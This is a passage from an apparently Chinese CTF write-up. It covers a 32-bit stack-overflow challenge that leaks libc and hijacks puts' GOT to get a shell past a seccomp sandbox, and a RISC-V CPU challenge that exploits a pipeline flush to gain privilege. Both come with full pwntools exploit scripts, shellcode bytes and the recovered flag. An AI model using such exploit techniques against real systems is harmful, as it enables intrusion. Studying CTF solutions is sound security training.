<a id="__codelineno-12-76" name="__codelineno-12-76" href="#__codelineno-12-76"></a><span class="n">sl</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<a id="__codelineno-12-77" name="__codelineno-12-77" href="#__codelineno-12-77"></a><span class="c1">#debug()</span>
<a id="__codelineno-12-78" name="__codelineno-12-78" href="#__codelineno-12-78"></a><span class="n">sl</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;a&quot;</span><span class="p">)</span>
<a id="__codelineno-12-79" name="__codelineno-12-79" href="#__codelineno-12-79"></a><span class="n">itr</span><span class="p">()</span>
</code></pre></div></p>
<h3 id="safe">safe<a class="headerlink" href="#safe" title="Permanent link">&para;</a></h3>
<p><strong>三血</strong>
第一次做多线程pwn，看一看，就是存在unsafecode和safecode，safecode一直调用puts，unsafecode存在栈溢出，但是有个沙箱
<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>In the sandbox...
<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a> line  CODE  JT   JF      K
<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>=================================
<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a> 0000: 0x20 0x00 0x00 0x00000004  A = arch
<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a> 0001: 0x15 0x00 0x06 0x40000003  if (A != ARCH_I386) goto 0008
<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a> 0003: 0x15 0x03 0x00 0x00000001  if (A == exit) goto 0007
<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a> 0004: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0007
<a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a> 0005: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0007
<a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a> 0006: 0x15 0x00 0x01 0x000000ad  if (A != rt_sigreturn) goto 0008
<a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
<a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a> 0008: 0x06 0x00 0x00 0x00000000  return KILL
<a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a> ```
<a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a>被ban的差不多了，没开pie，我们通过栈溢出打putsplt、puts_got的那一条链子来泄露libc吗，然后用call read_plt的方法，设置好参数，来重写puts的got，从而劫持puts，因为safecode并没有开沙箱，所以劫持这个到read前面沙箱后面，这样再打一次栈溢出拿shell，不过tmd，这B题一个是调试起来很困难，然后还有就是32位传多个参数的顺序，最后还有奇怪的情况，明明system的传参是\bin\sh的地址，还是拿不到shell，最后一点一点跟发现是在execve的时候，他的environ参数是0x41414141，应该是ebp被写坏出的奇怪问题，懒得修了，反正把padding换成\x00就行了，改完ok，所以你会发现我的脚本用的padding都是\x00
<a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a>脚本如下
<a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a>```python
<a id="__codelineno-13-17" name="__codelineno-13-17" href="#__codelineno-13-17"></a>from pwn import *
<a id="__codelineno-13-18" name="__codelineno-13-18" href="#__codelineno-13-18"></a>
<a id="__codelineno-13-19" name="__codelineno-13-19" href="#__codelineno-13-19"></a>
<a id="__codelineno-13-20" name="__codelineno-13-20" href="#__codelineno-13-20"></a>
<a id="__codelineno-13-21" name="__codelineno-13-21" href="#__codelineno-13-21"></a>context.log_level = &#39;debug&#39;
<a id="__codelineno-13-22" name="__codelineno-13-22" href="#__codelineno-13-22"></a>#context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
<a id="__codelineno-13-23" name="__codelineno-13-23" href="#__codelineno-13-23"></a>def s(a):
<a id="__codelineno-13-24" name="__codelineno-13-24" href="#__codelineno-13-24"></a>    p.send(a)
<a id="__codelineno-13-25" name="__codelineno-13-25" href="#__codelineno-13-25"></a>
<a id="__codelineno-13-26" name="__codelineno-13-26" href="#__codelineno-13-26"></a>
<a id="__codelineno-13-27" name="__codelineno-13-27" href="#__codelineno-13-27"></a>def sa(a, b):
<a id="__codelineno-13-28" name="__codelineno-13-28" href="#__codelineno-13-28"></a>    p.sendafter(a, b)
<a id="__codelineno-13-29" name="__codelineno-13-29" href="#__codelineno-13-29"></a>
<a id="__codelineno-13-30" name="__codelineno-13-30" href="#__codelineno-13-30"></a>
<a id="__codelineno-13-31" name="__codelineno-13-31" href="#__codelineno-13-31"></a>def sl(a):
<a id="__codelineno-13-32" name="__codelineno-13-32" href="#__codelineno-13-32"></a>    p.sendline(a)
<a id="__codelineno-13-33" name="__codelineno-13-33" href="#__codelineno-13-33"></a>
<a id="__codelineno-13-34" name="__codelineno-13-34" href="#__codelineno-13-34"></a>
<a id="__codelineno-13-35" name="__codelineno-13-35" href="#__codelineno-13-35"></a>def sla(a, b):
<a id="__codelineno-13-36" name="__codelineno-13-36" href="#__codelineno-13-36"></a>    p.sendlineafter(a, b)
<a id="__codelineno-13-37" name="__codelineno-13-37" href="#__codelineno-13-37"></a>
<a id="__codelineno-13-38" name="__codelineno-13-38" href="#__codelineno-13-38"></a>
<a id="__codelineno-13-39" name="__codelineno-13-39" href="#__codelineno-13-39"></a>def r():
<a id="__codelineno-13-40" name="__codelineno-13-40" href="#__codelineno-13-40"></a>    p.recv()
<a id="__codelineno-13-41" name="__codelineno-13-41" href="#__codelineno-13-41"></a>
<a id="__codelineno-13-42" name="__codelineno-13-42" href="#__codelineno-13-42"></a>
<a id="__codelineno-13-43" name="__codelineno-13-43" href="#__codelineno-13-43"></a>def pr():
<a id="__codelineno-13-44" name="__codelineno-13-44" href="#__codelineno-13-44"></a>    print(p.recv())
<a id="__codelineno-13-45" name="__codelineno-13-45" href="#__codelineno-13-45"></a>
<a id="__codelineno-13-46" name="__codelineno-13-46" href="#__codelineno-13-46"></a>def ru(a):
<a id="__codelineno-13-47" name="__codelineno-13-47" href="#__codelineno-13-47"></a>    return p.recvuntil(a)
<a id="__codelineno-13-48" name="__codelineno-13-48" href="#__codelineno-13-48"></a>
<a id="__codelineno-13-49" name="__codelineno-13-49" href="#__codelineno-13-49"></a>def rl(a):
<a id="__codelineno-13-50" name="__codelineno-13-50" href="#__codelineno-13-50"></a>    return p.recvline(a)
<a id="__codelineno-13-51" name="__codelineno-13-51" href="#__codelineno-13-51"></a>
<a id="__codelineno-13-52" name="__codelineno-13-52" href="#__codelineno-13-52"></a>
<a id="__codelineno-13-53" name="__codelineno-13-53" href="#__codelineno-13-53"></a>def itr():
<a id="__codelineno-13-54" name="__codelineno-13-54" href="#__codelineno-13-54"></a>    p.interactive()
<a id="__codelineno-13-55" name="__codelineno-13-55" href="#__codelineno-13-55"></a>
<a id="__codelineno-13-56" name="__codelineno-13-56" href="#__codelineno-13-56"></a>
<a id="__codelineno-13-57" name="__codelineno-13-57" href="#__codelineno-13-57"></a>def debug():
<a id="__codelineno-13-58" name="__codelineno-13-58" href="#__codelineno-13-58"></a>    gdb.attach(p)
<a id="__codelineno-13-59" name="__codelineno-13-59" href="#__codelineno-13-59"></a>choice=0
<a id="__codelineno-13-60" name="__codelineno-13-60" href="#__codelineno-13-60"></a>if(choice==1):
<a id="__codelineno-13-61" name="__codelineno-13-61" href="#__codelineno-13-61"></a>    gdbscript=&#39;&#39;&#39;
<a id="__codelineno-13-62" name="__codelineno-13-62" href="#__codelineno-13-62"></a>    #set scheduler-locking on
<a id="__codelineno-13-63" name="__codelineno-13-63" href="#__codelineno-13-63"></a>    #b *0x08048826
<a id="__codelineno-13-64" name="__codelineno-13-64" href="#__codelineno-13-64"></a>    b *0x804883A
<a id="__codelineno-13-65" name="__codelineno-13-65" href="#__codelineno-13-65"></a>    b read
<a id="__codelineno-13-66" name="__codelineno-13-66" href="#__codelineno-13-66"></a>    c
<a id="__codelineno-13-67" name="__codelineno-13-67" href="#__codelineno-13-67"></a>    c
<a id="__codelineno-13-68" name="__codelineno-13-68" href="#__codelineno-13-68"></a>    &#39;&#39;&#39;
<a id="__codelineno-13-69" name="__codelineno-13-69" href="#__codelineno-13-69"></a>    p=gdb.debug(&quot;./safe&quot;,gdbscript=gdbscript)
<a id="__codelineno-13-70" name="__codelineno-13-70" href="#__codelineno-13-70"></a>elif(choice==2):
<a id="__codelineno-13-71" name="__codelineno-13-71" href="#__codelineno-13-71"></a>    p=process(&quot;./safe&quot;)
<a id="__codelineno-13-72" name="__codelineno-13-72" href="#__codelineno-13-72"></a>else:
<a id="__codelineno-13-73" name="__codelineno-13-73" href="#__codelineno-13-73"></a>    p=remote(&#39;127.0.0.1&#39;,59728)
<a id="__codelineno-13-74" name="__codelineno-13-74" href="#__codelineno-13-74"></a>read_plt=0x8048590
<a id="__codelineno-13-75" name="__codelineno-13-75" href="#__codelineno-13-75"></a>pop3_ret=0x8048949
<a id="__codelineno-13-76" name="__codelineno-13-76" href="#__codelineno-13-76"></a>bss_addr=0x804a000+0x100
<a id="__codelineno-13-77" name="__codelineno-13-77" href="#__codelineno-13-77"></a>puts_got=0x804a030-8
<a id="__codelineno-13-78" name="__codelineno-13-78" href="#__codelineno-13-78"></a>exit_plt=0x80488E9
<a id="__codelineno-13-79" name="__codelineno-13-79" href="#__codelineno-13-79"></a>pop1_ret=0x804894b
<a id="__codelineno-13-80" name="__codelineno-13-80" href="#__codelineno-13-80"></a>pop2_ret=0x0804894A
<a id="__codelineno-13-81" name="__codelineno-13-81" href="#__codelineno-13-81"></a>
<a id="__codelineno-13-82" name="__codelineno-13-82" href="#__codelineno-13-82"></a>&#39;&#39;&#39;
<a id="__codelineno-13-83" name="__codelineno-13-83" href="#__codelineno-13-83"></a>
<a id="__codelineno-13-84" name="__codelineno-13-84" href="#__codelineno-13-84"></a>&#39;&#39;&#39;
<a id="__codelineno-13-85" name="__codelineno-13-85" href="#__codelineno-13-85"></a>puts_plt=0x080485F0
<a id="__codelineno-13-86" name="__codelineno-13-86" href="#__codelineno-13-86"></a>payload=b&quot;\x00&quot;*0x408+p32(bss_addr)+p32(puts_plt)+p32(pop1_ret)+p32(puts_got)+p32(read_plt)+p32(pop3_ret)+p32(0)+p32(bss_addr)+p32(0x200)+p32(read_plt)+p32(exit_plt)+p32(0)+p32(puts_got)+p32(10)
<a id="__codelineno-13-87" name="__codelineno-13-87" href="#__codelineno-13-87"></a>payload+=b&quot;\x00&quot;*(0x800-len(payload))
<a id="__codelineno-13-88" name="__codelineno-13-88" href="#__codelineno-13-88"></a>s(payload)
<a id="__codelineno-13-89" name="__codelineno-13-89" href="#__codelineno-13-89"></a>if(choice==0):
<a id="__codelineno-13-90" name="__codelineno-13-90" href="#__codelineno-13-90"></a>    ru(b&quot;In the sandbox...\n&quot;)
<a id="__codelineno-13-91" name="__codelineno-13-91" href="#__codelineno-13-91"></a>    s1=u32(p.recvn(4))
<a id="__codelineno-13-92" name="__codelineno-13-92" href="#__codelineno-13-92"></a>    print(hex(s1))
<a id="__codelineno-13-93" name="__codelineno-13-93" href="#__codelineno-13-93"></a>else:
<a id="__codelineno-13-94" name="__codelineno-13-94" href="#__codelineno-13-94"></a>    s1=u32(p.recvuntil(&#39;\xf7&#39;)[-4:])
<a id="__codelineno-13-95" name="__codelineno-13-95" href="#__codelineno-13-95"></a>    print(hex(s1))
<a id="__codelineno-13-96" name="__codelineno-13-96" href="#__codelineno-13-96"></a>libc=ELF(&quot;./libc-2.27.so&quot;)
<a id="__codelineno-13-97" name="__codelineno-13-97" href="#__codelineno-13-97"></a>libc_base=s1-libc.sym[&#39;puts&#39;]
<a id="__codelineno-13-98" name="__codelineno-13-98" href="#__codelineno-13-98"></a>print(&quot;libc_base&quot;,hex(libc_base))
<a id="__codelineno-13-99" name="__codelineno-13-99" href="#__codelineno-13-99"></a>open_addr=libc_base+libc.sym[&#39;open&#39;]
<a id="__codelineno-13-100" name="__codelineno-13-100" href="#__codelineno-13-100"></a>write_addr=libc_base+libc.sym[&#39;write&#39;]
<a id="__codelineno-13-101" name="__codelineno-13-101" href="#__codelineno-13-101"></a>system_addr=libc_base+libc.sym[&#39;system&#39;]
<a id="__codelineno-13-102" name="__codelineno-13-102" href="#__codelineno-13-102"></a>binsh_addr=libc_base+next(libc.search(b&#39;/bin/sh\x00&#39;))
<a id="__codelineno-13-103" name="__codelineno-13-103" href="#__codelineno-13-103"></a>ret_addr=libc_base+libc.search(asm(&quot;ret&quot;)).__next__()
<a id="__codelineno-13-104" name="__codelineno-13-104" href="#__codelineno-13-104"></a>sleep(0.001)
<a id="__codelineno-13-105" name="__codelineno-13-105" href="#__codelineno-13-105"></a>#0x00003aac 
<a id="__codelineno-13-106" name="__codelineno-13-106" href="#__codelineno-13-106"></a>pop_esp=0x00003aac+libc_base
<a id="__codelineno-13-107" name="__codelineno-13-107" href="#__codelineno-13-107"></a>#payload2=
<a id="__codelineno-13-108" name="__codelineno-13-108" href="#__codelineno-13-108"></a>#payload2=b&quot;/flag\x00\x00\x00&quot;+p32(open_addr)+p32(pop2_ret)+p32(0)+p32(bss_addr)+p32(read_plt)+p32(pop3_ret)+p32(0x200)+p32(bss_addr+0x400)+p32(3)+p32(write_addr)+p32(pop3_ret)+p32(0x200)+p32(bss_addr+0x400)+p32(1)
<a id="__codelineno-13-109" name="__codelineno-13-109" href="#__codelineno-13-109"></a>payload2=p32(system_addr)+p32(pop1_ret)+p32(binsh_addr)
<a id="__codelineno-13-110" name="__codelineno-13-110" href="#__codelineno-13-110"></a>payload2+=b&quot;\x00&quot;*(0x200-len(payload2))
<a id="__codelineno-13-111" name="__codelineno-13-111" href="#__codelineno-13-111"></a>s(payload2)
<a id="__codelineno-13-112" name="__codelineno-13-112" href="#__codelineno-13-112"></a>payload3=p32(0x8048809)
<a id="__codelineno-13-113" name="__codelineno-13-113" href="#__codelineno-13-113"></a>payload3+=b&quot;\x00&quot;*(10-len(payload3))
<a id="__codelineno-13-114" name="__codelineno-13-114" href="#__codelineno-13-114"></a>s(payload3)
<a id="__codelineno-13-115" name="__codelineno-13-115" href="#__codelineno-13-115"></a>
<a id="__codelineno-13-116" name="__codelineno-13-116" href="#__codelineno-13-116"></a>payload4=(0xf7c6c2e8-0xf7c6bf30-12)*b&quot;\x00&quot;+p32(0x400000)*3+p32(ret_addr)+p32(system_addr)+p32(0xdeadbeef)+p32(binsh_addr)
<a id="__codelineno-13-117" name="__codelineno-13-117" href="#__codelineno-13-117"></a>s(payload4)
<a id="__codelineno-13-118" name="__codelineno-13-118" href="#__codelineno-13-118"></a>&#39;&#39;&#39;
<a id="__codelineno-13-119" name="__codelineno-13-119" href="#__codelineno-13-119"></a>payload=0x408*b&quot;A&quot;+p32(0xdeadbeef)+p32(read_plt)+p32(ret1_addr)+p32(0x200)+p32(bss_addr)+p32(0)
<a id="__codelineno-13-120" name="__codelineno-13-120" href="#__codelineno-13-120"></a>payload+=p32(read_plt)+p32(exit_plt)+p32(10)+p32(puts_got)+p32(0)
<a id="__codelineno-13-121" name="__codelineno-13-121" href="#__codelineno-13-121"></a>payload+=b&quot;A&quot;*(0x800-len(payload))
<a id="__codelineno-13-122" name="__codelineno-13-122" href="#__codelineno-13-122"></a>s(payload)
<a id="__codelineno-13-123" name="__codelineno-13-123" href="#__codelineno-13-123"></a>&#39;&#39;&#39;
<a id="__codelineno-13-124" name="__codelineno-13-124" href="#__codelineno-13-124"></a>itr()
</code></pre></div>
拿下</p>
<h3 id="cs_master">cs_master<a class="headerlink" href="#cs_master" title="Permanent link">&para;</a></h3>
<p><strong>一血</strong>
<strong>“将军说CPU一定要有人写”队名的由来</strong>
CPU pwn，笑死了最有意思的一集。
看了一大堆，刚开始不知道做什么，仔细读发现是要去一片被保护的区域里面读内存，虽然我本地上跑他一直是特权态，一直都能读出来，随后发现远程上不行。随后思路就是如何进入特权态，想的办法就是ecall，但是ecall会卡死，仔细看波形图发现他ecall会跳入stvec，但是stvec的值是0，然后从0再跑回shellcode，然后再执行shellcode里面的ecall，导致卡死，但是想要劫持stvec又要csrw，这个有要求要特权态，这不就死循环了吗，后面就像如何在不执行ecall下进入特权态，仔细看代码发现branch_taken的优先级大于ecall，也就是flush优先级更高，而且flush不会清空next_privilege，导致如果我们b型后面加一条ecall，然后b型跳走，这样可以偷到特权态，随后执行即可拿到特权态，读出flag即可
工具有</p>
<p><a href="https://riscvasm.lucasteske.dev/#">RV32在线汇编器</a></p>
<p>将指令转换为base64
<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>
<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="c1"># 设置架构（虽然 p32 不需要这个上下文也能工作，但保持习惯很好）</span>
<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;riscv32&#39;</span>
<a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>
<a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="c1"># 这里放入你手动硬编码的机器码 (字符串形式)</span>
<a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="c1"># 不需要手动加 0x，脚本会自动处理</span>
<a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a><span class="n">hex_instructions</span> <span class="o">=</span> <span class="p">[</span>
<a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a>    <span class="s2">&quot;00000463&quot;</span><span class="p">,</span>
<a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a>    <span class="s2">&quot;00000073&quot;</span><span class="p">,</span>
<a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a>
<a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a>    <span class="s2">&quot;00100093&quot;</span><span class="p">,</span>
<a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a>    <span class="s2">&quot;01f00113&quot;</span><span class="p">,</span>
<a id="__codelineno-14-15" name="__codelineno-14-15" href="#__codelineno-14-15"></a>    <span class="s2">&quot;002090b3&quot;</span><span class="p">,</span>
<a id="__codelineno-14-16" name="__codelineno-14-16" href="#__codelineno-14-16"></a>    <span class="s2">&quot;00008093&quot;</span><span class="p">,</span>
<a id="__codelineno-14-17" name="__codelineno-14-17" href="#__codelineno-14-17"></a>    <span class="s2">&quot;0000a183&quot;</span><span class="p">,</span>
<a id="__codelineno-14-18" name="__codelineno-14-18" href="#__codelineno-14-18"></a>
<a id="__codelineno-14-19" name="__codelineno-14-19" href="#__codelineno-14-19"></a>
<a id="__codelineno-14-20" name="__codelineno-14-20" href="#__codelineno-14-20"></a>
<a id="__codelineno-14-21" name="__codelineno-14-21" href="#__codelineno-14-21"></a>
<a id="__codelineno-14-22" name="__codelineno-14-22" href="#__codelineno-14-22"></a>    <span class="s2">&quot;0040a203&quot;</span><span class="p">,</span>
<a id="__codelineno-14-23" name="__codelineno-14-23" href="#__codelineno-14-23"></a>    <span class="s2">&quot;0080a283&quot;</span><span class="p">,</span>
<a id="__codelineno-14-24" name="__codelineno-14-24" href="#__codelineno-14-24"></a>    <span class="s2">&quot;00c0a303&quot;</span><span class="p">,</span>
<a id="__codelineno-14-25" name="__codelineno-14-25" href="#__codelineno-14-25"></a>    <span class="s2">&quot;0100a383&quot;</span><span class="p">,</span>
<a id="__codelineno-14-26" name="__codelineno-14-26" href="#__codelineno-14-26"></a>    <span class="s2">&quot;0140a403&quot;</span><span class="p">,</span>
<a id="__codelineno-14-27" name="__codelineno-14-27" href="#__codelineno-14-27"></a>    <span class="s2">&quot;0180a483&quot;</span><span class="p">,</span>
<a id="__codelineno-14-28" name="__codelineno-14-28" href="#__codelineno-14-28"></a>    <span class="s2">&quot;01c0a503&quot;</span><span class="p">,</span>
<a id="__codelineno-14-29" name="__codelineno-14-29" href="#__codelineno-14-29"></a>    <span class="s2">&quot;0200a583&quot;</span><span class="p">,</span>
<a id="__codelineno-14-30" name="__codelineno-14-30" href="#__codelineno-14-30"></a>    <span class="s2">&quot;0240a603&quot;</span><span class="p">,</span>
<a id="__codelineno-14-31" name="__codelineno-14-31" href="#__codelineno-14-31"></a>    <span class="s2">&quot;0280a683&quot;</span><span class="p">,</span>
<a id="__codelineno-14-32" name="__codelineno-14-32" href="#__codelineno-14-32"></a>    <span class="s2">&quot;02c0a703&quot;</span><span class="p">,</span>
<a id="__codelineno-14-33" name="__codelineno-14-33" href="#__codelineno-14-33"></a>    <span class="c1">#&quot;10200073&quot;,</span>
<a id="__codelineno-14-34" name="__codelineno-14-34" href="#__codelineno-14-34"></a>
<a id="__codelineno-14-35" name="__codelineno-14-35" href="#__codelineno-14-35"></a><span class="p">]</span>
<a id="__codelineno-14-36" name="__codelineno-14-36" href="#__codelineno-14-36"></a><span class="c1">#ZJUCTF{}</span>
<a id="__codelineno-14-37" name="__codelineno-14-37" href="#__codelineno-14-37"></a><span class="n">code</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;&quot;</span>
<a id="__codelineno-14-38" name="__codelineno-14-38" href="#__codelineno-14-38"></a>
<a id="__codelineno-14-39" name="__codelineno-14-39" href="#__codelineno-14-39"></a><span class="k">for</span> <span class="n">h</span> <span class="ow">in</span> <span class="n">hex_instructions</span><span class="p">:</span>
<a id="__codelineno-14-40" name="__codelineno-14-40" href="#__codelineno-14-40"></a>    <span class="c1"># 1. int(h, 16) 将十六进制字符串转为整数</span>
<a id="__codelineno-14-41" name="__codelineno-14-41" href="#__codelineno-14-41"></a>    <span class="c1"># 2. p32(...) 将整数转为 32位小端序字节流 (RISC-V 格式)</span>
<a id="__codelineno-14-42" name="__codelineno-14-42" href="#__codelineno-14-42"></a>    <span class="n">code</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span>
<a id="__codelineno-14-43" name="__codelineno-14-43" href="#__codelineno-14-43"></a>
<a id="__codelineno-14-44" name="__codelineno-14-44" href="#__codelineno-14-44"></a><span class="c1"># Base64 编码</span>
<a id="__codelineno-14-45" name="__codelineno-14-45" href="#__codelineno-14-45"></a><span class="n">payload</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">code</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
<a id="__codelineno-14-46" name="__codelineno-14-46" href="#__codelineno-14-46"></a>
<a id="__codelineno-14-47" name="__codelineno-14-47" href="#__codelineno-14-47"></a><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Payload generated:&quot;</span><span class="p">)</span>
<a id="__codelineno-14-48" name="__codelineno-14-48" href="#__codelineno-14-48"></a><span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</code></pre></div>
随后将生成的base64传进远程，查看寄存器信息，手动dump出来，翻译一下即可
<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="n">flag</span><span class="o">=</span><span class="sa">b</span><span class="s2">&quot;&quot;</span>
<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="k">def</span><span class="w"> </span><span class="nf">add</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>    <span class="k">global</span> <span class="n">flag</span>
<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>    <span class="n">flag</span><span class="o">+=</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;I&quot;</span><span class="p">,</span> <span class="n">a</span><span class="p">)</span>
<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>
<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="n">add</span><span class="p">(</span><span class="mh">0x43554a5a</span><span class="p">)</span>
<a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="n">add</span><span class="p">(</span><span class="mh">0x797b4654</span><span class="p">)</span>
<a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a><span class="n">add</span><span class="p">(</span><span class="mh">0x6d5f7530</span><span class="p">)</span>
<a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a><span class="n">add</span><span class="p">(</span><span class="mh">0x5f743575</span><span class="p">)</span>
<a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a><span class="n">add</span><span class="p">(</span><span class="mh">0x345f3362</span><span class="p">)</span>
<a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a><span class="n">add</span><span class="p">(</span><span class="mh">0x6d30635f</span><span class="p">)</span>
<a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a><span class="n">add</span><span class="p">(</span><span class="mh">0x33747570</span><span class="p">)</span>
<a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a><span class="n">add</span><span class="p">(</span><span class="mh">0x79355f72</span><span class="p">)</span>
<a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a><span class="n">add</span><span class="p">(</span><span class="mh">0x6d337435</span><span class="p">)</span>
<a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a><span class="n">add</span><span class="p">(</span><span class="mh">0x35406d5f</span><span class="p">)</span>
<a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a><span class="n">add</span><span class="p">(</span><span class="mh">0x7d723374</span><span class="p">)</span>
<a id="__codelineno-15-18" name="__codelineno-15-18" href="#__codelineno-15-18"></a><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
<a id="__codelineno-15-19" name="__codelineno-15-19" href="#__codelineno-15-19"></a><span class="n">ZJUCTF</span><span class="p">{</span><span class="n">y0u_mu5t_b3_4_c0mput3r_5y5t3m_m</span><span class="o">@</span><span class="mi">5</span><span class="n">t3r</span><span class="p">}</span>
<a id="__codelineno-15-20" name="__codelineno-15-20" href="#__codelineno-15-20"></a><span class="sd">&#39;&#39;&#39;</span>
<a id="__codelineno-15-21" name="__codelineno-15-21" href="#__codelineno-15-21"></a><span class="sd">global _boot</span>
<a id="__codelineno-15-22" name="__codelineno-15-22" href="#__codelineno-15-22"></a><span class="sd">.text</span>
<a id="__codelineno-15-23" name="__codelineno-15-23" href="#__codelineno-15-23"></a>
<a id="__codelineno-15-24" name="__codelineno-15-24" href="#__codelineno-15-24"></a><span class="sd">_boot:                    /* x0  = 0    0x000 */</span>
<a id="__codelineno-15-25" name="__codelineno-15-25" href="#__codelineno-15-25"></a><span class="sd">    /* Test ADDI */</span>
<a id="__codelineno-15-26" name="__codelineno-15-26" href="#__codelineno-15-26"></a><span class="sd">    beq x0,x0,loop</span>
<a id="__codelineno-15-27" name="__codelineno-15-27" href="#__codelineno-15-27"></a><span class="sd">    ecall</span>
<a id="__codelineno-15-28" name="__codelineno-15-28" href="#__codelineno-15-28"></a><span class="sd"> loop:   </span>
<a id="__codelineno-15-29" name="__codelineno-15-29" href="#__codelineno-15-29"></a><span class="sd">    li x1,0x1</span>
<a id="__codelineno-15-30" name="__codelineno-15-30" href="#__codelineno-15-30"></a><span class="sd">    li x2,31</span>
<a id="__codelineno-15-31" name="__codelineno-15-31" href="#__codelineno-15-31"></a><span class="sd">    sll x1,x1,x2</span>
<a id="__codelineno-15-32" name="__codelineno-15-32" href="#__codelineno-15-32"></a><span class="sd">    addi x1,x1,0</span>
<a id="__codelineno-15-33" name="__codelineno-15-33" href="#__codelineno-15-33"></a><span class="sd">    lw x3,0(x1)</span>
<a id="__codelineno-15-34" name="__codelineno-15-34" href="#__codelineno-15-34"></a><span class="sd">    lw x4,4(x1)</span>
<a id="__codelineno-15-35" name="__codelineno-15-35" href="#__codelineno-15-35"></a><span class="sd">    lw x5,8(x1)</span>
<a id="__codelineno-15-36" name="__codelineno-15-36" href="#__codelineno-15-36"></a><span class="sd">    lw x6,12(x1)</span>
<a id="__codelineno-15-37" name="__codelineno-15-37" href="#__codelineno-15-37"></a><span class="sd">    lw x7,16(x1)</span>
<a id="__codelineno-15-38" name="__codelineno-15-38" href="#__codelineno-15-38"></a><span class="sd">    lw x8,20(x1)</span>
<a id="__codelineno-15-39" name="__codelineno-15-39" href="#__codelineno-15-39"></a><span class="sd">    lw x9,24(x1)</span>
